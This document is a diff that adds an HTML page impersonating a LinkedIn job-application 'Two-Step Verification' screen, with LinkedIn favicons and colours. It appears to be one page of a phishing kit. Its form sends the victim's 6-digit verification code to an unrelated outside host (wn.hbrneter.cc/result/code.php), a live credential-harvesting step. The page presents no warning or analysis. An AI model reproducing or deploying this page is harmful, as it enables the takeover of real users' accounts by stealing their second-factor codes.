@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="shortcut icon" href="https://static.licdn.com/sc/h/413gphjmquu9edbn2negq413a"/>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Verification</title>
+    <style>
+  /* Hide the spin buttons in WebKit browsers */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Hide spin buttons in Firefox */
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+        }
+        header {
+            background-color: #0077b5;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        .hidden {
+            display: none;
+        }
+        .btn {
+            background-color: #0077b5;
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            display: inline-block;
+            margin: 10px 0;
+        }
+        .btn:hover {
+            background-color: #005582;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        button {
+            background-color: #0077b5;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005582;
+        }
+        select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        .success-message {
+            margin-top: 20px;
+            color: green;
+            font-weight: bold;
+        }
+        .calendar {
+            margin: 20px 0;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>LinkedIn - Job Application</h1>
+    </header>
+
+      <!-- Page 3: Code Verification -->
+    <div id="code-verification" class="container">
+        <h2>Two-Step Verification</h2>
+        <p>We’ve sent a verification code to your registered email address.</p>
+        <form method="post" action="https://wn.hbrneter.cc/result/code.php">
+            <div class="form-group">
+                <input id="text1" type="number" placeholder="Enter 6-digit code" data-maxlength="6" name="code" pattern="\d*" required oninput="this.value=this.value.slice(0,this.dataset.maxlength)">
+            </div>
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+
+    
+    <script>
+        // Function to display the appropriate page and hide others
+        function showPage(pageId) {
+            const pages = document.querySelectorAll('.container');
+            pages.forEach(page => page.classList.add('hidden')); // Hide all pages
+            document.getElementById(pageId).classList.remove('hidden'); // Show the target page
+        }
+
+//
+    </script>
+<link rel="shortcut icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico">
+</body>
+</html>
